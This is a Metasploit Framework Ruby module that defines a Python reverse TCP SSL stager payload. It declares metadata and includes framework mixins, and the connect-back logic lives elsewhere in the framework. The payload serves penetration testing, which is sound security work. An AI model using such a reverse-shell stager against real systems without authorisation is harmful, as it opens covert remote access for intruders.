##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/core/payload/python/reverse_tcp_ssl'

module MetasploitModule

  CachedSize = 470

  include Msf::Payload::Stager
  include Msf::Payload::Python::ReverseTcpSsl

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Python Reverse TCP SSL Stager',
      'Description'   => 'Reverse Python connect back stager using SSL',
      'Author'        => ['Ben Campbell', 'RageLtMan'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Handler'       => Msf::Handler::ReverseTcpSsl,
      'Stager'        => {'Payload' => ""}
      ))
  end
end
